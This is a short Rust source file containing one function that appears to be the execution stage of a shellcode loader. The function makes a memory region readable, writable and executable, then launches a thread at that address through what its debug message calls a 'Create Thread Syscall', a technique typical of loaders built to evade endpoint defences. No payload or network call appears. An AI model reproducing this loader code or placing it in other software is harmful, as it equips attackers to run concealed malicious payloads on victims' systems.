pub unsafe fn exec(p: usize, size: usize) -> Result<(), String> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Executing via Create Thread Syscall...");

    use crate::api::PAGE_EXECUTE_READWRITE;
    crate::api::protect_virtual_memory(-1, p, size, PAGE_EXECUTE_READWRITE)?;

    let thread_handle = crate::api::create_thread_ex(p, p)?;

    let wait_status = crate::api::wait_for_single_object(thread_handle);

    if wait_status < 0 {
        #[cfg(feature = "debug")]
        crate::utils::print_error("Error", &format!("NtWaitForSingleObject failed: {:#x}", wait_status));
    }

    crate::api::close_handle(thread_handle);

    Ok(())
}